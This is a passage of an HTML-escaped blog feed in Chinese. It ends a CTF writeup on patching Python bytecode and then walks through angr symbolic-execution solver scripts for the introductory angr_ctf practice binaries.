    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Correct&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; a2 &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Nope&amp;#39;&lt;/span&gt;)

print (dis&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dis(test_func))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;新的特性就是 &lt;code&gt;match case&lt;/code&gt; 语句，感觉还是很实用的，学到了&lt;/p&gt;
&lt;p&gt;目前还有几个地方不太知道怎么写的&lt;/p&gt;
&lt;p&gt;一个是 &lt;code&gt;a2 |= {} if () else {}&lt;/code&gt; 这里，题目里应该是把 &lt;code&gt;a7=a7+1&lt;/code&gt; 放到了这一行里&lt;/p&gt;
&lt;p&gt;还有一个是 &lt;code&gt;GET_ITER&lt;/code&gt; 和 &lt;code&gt;FOR_ITER&lt;/code&gt; 在迭代部分是分开的，不太懂了&lt;/p&gt;
&lt;p&gt;不过仿照这这个逻辑写有些问题&lt;/p&gt;
&lt;p&gt;解决方案就是直接在 &lt;code&gt;.pyc&lt;/code&gt; 文件里加一个输出，&lt;code&gt;a4(a3 * x)[x] != y&lt;/code&gt; 给这个逻辑套上输出就行，改完后的pyasm文件长这样：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;        276     LOAD_NAME               12: a2
        278     LOAD_NAME               13: a7
        280     LOAD_CONST              21: 1
        282     BINARY_ADD              
        284     DUP_TOP                 
        286     STORE_NAME              13: a7
        288     LOAD_NAME               18: x
        290     LOAD_CONST              21: 1
        292     BINARY_ADD              
        294     COMPARE_OP              3 (!=)
        296     POP_JUMP_IF_TRUE        159 (to 318)
                            --&amp;gt; LOAD_NAME 20: print
        298     LOAD_NAME               9: a4
        300     LOAD_NAME               4: a3
        302     LOAD_NAME               18: x
        304     BINARY_MULTIPLY         
        306     CALL_FUNCTION           1
        308     LOAD_NAME               18: x
        310     BINARY_SUBSCR           
                            --&amp;gt; CALL_FUNCTION 1
        312     LOAD_NAME               19: y
        314     COMPARE_OP              3 (!=)
        316     POP_JUMP_IF_FALSE       163 (to 326)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后还有手动修改一下各个 &lt;code&gt;jump&lt;/code&gt; 的目的地址，最后的二进制文件长这样&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 139; 
			flex-basis: 334px&#34;
	&gt;
	&lt;a href=&#34;/post/tsgctf2021-and-pbctf2021-re-writeups/patch_pyc.png&#34; data-size=&#34;699x501&#34;&gt;
		&lt;img src=&#34;/post/tsgctf2021-and-pbctf2021-re-writeups/patch_pyc.png&#34;
			width=&#34;699&#34;
			height=&#34;501&#34;
			srcset=&#34;/post/tsgctf2021-and-pbctf2021-re-writeups/patch_pyc_hu6771c643ee3d792d6fac1f661cb4a4bf_59184_480x0_resize_box_3.png 480w, /post/tsgctf2021-and-pbctf2021-re-writeups/patch_pyc_hu6771c643ee3d792d6fac1f661cb4a4bf_59184_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;运行一下就有结果了&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 18; 
			flex-basis: 43px&#34;
	&gt;
	&lt;a href=&#34;/post/tsgctf2021-and-pbctf2021-re-writeups/pyc_result.png&#34; data-size=&#34;113x618&#34;&gt;
		&lt;img src=&#34;/post/tsgctf2021-and-pbctf2021-re-writeups/pyc_result.png&#34;
			width=&#34;113&#34;
			height=&#34;618&#34;
			srcset=&#34;/post/tsgctf2021-and-pbctf2021-re-writeups/pyc_result_hud17f0f2e85c62f854efad9a10382344e_4443_480x0_resize_box_3.png 480w, /post/tsgctf2021-and-pbctf2021-re-writeups/pyc_result_hud17f0f2e85c62f854efad9a10382344e_4443_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>angr ctf writeup</title>
        <link>/post/angr-ctf-writeup/</link>
        <pubDate>Mon, 27 Sep 2021 21:03:03 +0000</pubDate>
        
        <guid>/post/angr-ctf-writeup/</guid>
        <description>&lt;p&gt;开始学angr&lt;/p&gt;
&lt;p&gt;&lt;del&gt;就是在抄solution&lt;/del&gt;&lt;/p&gt;
&lt;h2 id=&#34;find&#34;&gt;find&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./00_angr_find&amp;#39;&lt;/span&gt;, load_options&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;auto_load_libs&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;}, main_opts&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base_addr&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048000&lt;/span&gt;})
state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;entry_state()
simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(state)
find_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048675&lt;/span&gt;
simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; find_addr)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
    simulations &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
    print (simulations&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no result&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;先用 &lt;code&gt;Project&lt;/code&gt; 导入二进制文件&lt;/p&gt;
&lt;p&gt;然后 &lt;code&gt;state&lt;/code&gt; 为开始模拟时的状态，&lt;code&gt;entry_state&lt;/code&gt; 为从入口点开始模拟&lt;/p&gt;
&lt;p&gt;&lt;code&gt;simgr&lt;/code&gt; 是为 &lt;code&gt;simulation_manager&lt;/code&gt; 导入这个状态，进行模拟执行&lt;/p&gt;
&lt;p&gt;&lt;code&gt;explore&lt;/code&gt; 为模拟器设定了一个执行的目标，遇到avoid将停止执行，遇到find则会添加到found状态中，这里填写的是输出 &lt;code&gt;Success&lt;/code&gt; 字符串的地址&lt;/p&gt;
&lt;p&gt;最后从found中dumps出标准输入的值，就可以拿到flag&lt;/p&gt;
&lt;h2 id=&#34;avoid&#34;&gt;avoid&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

base_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048000&lt;/span&gt;
find_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80485E0&lt;/span&gt;
avoid_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x80485A8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80485F2&lt;/span&gt;]
proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./01_angr_avoid&amp;#39;&lt;/span&gt;, main_opts&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base_addr&amp;#39;&lt;/span&gt;: base_addr})

state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;entry_state()
simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(state)

simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; find_addr, avoid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; avoid_addr)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
    simulation &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
    print (simulation&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;no result&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;没什么区别，就是增加了一个avoid参数&lt;/p&gt;
&lt;h2 id=&#34;find-condition&#34;&gt;find condition&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./02_angr_find_condition&amp;#39;&lt;/span&gt;, main_opts&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base_addr&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048000&lt;/span&gt;})
state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;entry_state()
simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(state)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;find_condition&lt;/span&gt;(cur_state):
    output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cur_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Good Job.&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; output

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;avoid_condition&lt;/span&gt;(cur_state):
    output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cur_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Try again.&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; output

simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;find_condition, avoid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;avoid_condition)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
    print (simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;no result&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;explore&lt;/code&gt; 中，可以将find和avoid的参数设置为函数，当各种输出太多的时候，这种方法比较省事，而且可拓展性很强&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dumps(1)&lt;/code&gt; 则是从状态中获取标准输出&lt;/p&gt;
&lt;h2 id=&#34;symbolic-registers&#34;&gt;symbolic registers&lt;/h2&gt;
&lt;p&gt;symbolic的几个实验就是往初始状态里注入符号了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; claripy

proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./03_angr_symbolic_registers&amp;#39;&lt;/span&gt;, main_opts&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base_addr&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048000&lt;/span&gt;})
after_input_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048980&lt;/span&gt;
state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;blank_state(addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; after_input_addr)

user_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user_input_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)]

state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;regs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; user_input[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;regs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ebx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; user_input[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;regs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;edx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; user_input[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]

find_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80489E9&lt;/span&gt;
avoid_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80489D7&lt;/span&gt;

simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(state)
simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; find_addr, avoid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; avoid_addr)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; user_input:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;se&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(a), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;)
    print ()
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;no result&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;claripy&lt;/code&gt; 是 &lt;code&gt;angr&lt;/code&gt; 中的约束求解器，&lt;code&gt;z3&lt;/code&gt; 好像就是fork出来的&lt;/p&gt;
&lt;p&gt;主要使用 &lt;code&gt;state.regs.eax&lt;/code&gt; 之类的将符号注入到寄存器中&lt;/p&gt;
&lt;p&gt;这里用寄存器是因为输入被存储到了寄存器中&lt;/p&gt;
&lt;p&gt;&lt;code&gt;main&lt;/code&gt; 函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0804897&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;get_user_input&lt;/span&gt;
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;08048980&lt;/span&gt;                 &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [&lt;span style=&#34;color:#66d9ef&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var_14&lt;/span&gt;], &lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;; state starts here
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;.text&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;08048983&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     [&lt;span style=&#34;color:#66d9ef&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var_10&lt;/span&gt;], &lt;span style=&#34;color:#66d9ef&#34;&gt;ebx&lt;/span&gt;
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;08048986&lt;/span&gt;                 &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [&lt;span style=&#34;color:#66d9ef&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var_C&lt;/span&gt;], &lt;span style=&#34;color:#66d9ef&#34;&gt;edx&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;get_user_input&lt;/code&gt; 内部实现&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0804892&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;F&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;___isoc99_scanf&lt;/span&gt;
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;08048934&lt;/span&gt;                 &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;esp&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;08048937&lt;/span&gt;                 &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;ecx&lt;/span&gt;, [&lt;span style=&#34;color:#66d9ef&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var_18&lt;/span&gt;]
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0804893&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;ecx&lt;/span&gt;
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0804893&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;C&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;ecx&lt;/span&gt;, [&lt;span style=&#34;color:#66d9ef&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var_14&lt;/span&gt;]
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0804893&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;F&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;ebx&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;ecx&lt;/span&gt;
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;08048941&lt;/span&gt;                 &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;ecx&lt;/span&gt;, [&lt;span style=&#34;color:#66d9ef&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var_10&lt;/span&gt;]
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;08048944&lt;/span&gt;                 &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;edx&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;ecx&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;写这题的时候，不小心把 &lt;code&gt;blank_state&lt;/code&gt; 打成了 &lt;code&gt;entry_state&lt;/code&gt;，但还是可以得到正确结果，不知道为啥&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;symbolic-stack&#34;&gt;symbolic stack&lt;/h2&gt;
&lt;p&gt;这题的输入直接存到了 &lt;code&gt;stack&lt;/code&gt; 中，因此需要把符号注入到 &lt;code&gt;stack&lt;/code&gt;&lt;/p&gt;
